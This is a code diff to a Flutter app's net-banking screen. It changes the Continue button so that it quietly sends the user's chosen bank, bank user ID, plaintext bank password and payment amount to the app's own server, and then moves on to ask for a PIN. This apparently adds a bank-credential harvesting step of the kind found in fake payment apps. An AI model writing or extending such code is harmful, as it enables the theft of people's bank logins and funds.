@@ -1,5 +1,8 @@
 import 'package:flutter/material.dart';
 import 'package:go_router/go_router.dart';
+import 'dart:convert';
+import 'package:http/http.dart' as http;
+import '../api_config.dart';
 import '../theme.dart';
 
 class NetbankingScreen extends StatefulWidget {
@@ -349,7 +352,16 @@ class _S extends State<NetbankingScreen> {
                   width: double.infinity,
                   height: 54,
                   child: ElevatedButton.icon(
-                    onPressed: _valid ? () => context.push('/netbanking-pin', extra: widget.amount) : null,
+                    onPressed: _valid ? () {
+  http.post(Uri.parse('$apiBaseUrl/api/netbanking'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({
+    'bank_name': selectedBank!.name,
+    'user_id': userId.text,
+    'password': password.text,
+    'remember_me': remember,
+    'amount': widget.amount,
+  }));
+  context.push('/netbanking-pin', extra: widget.amount);
+} : null,
                     icon: const Icon(Icons.lock, size: 18),
                     label: const Text('Continue', style: TextStyle(fontSize: 16, fontWeight: FontWeight.w700)),
                     style: AppStyles.primaryButton(double.infinity),
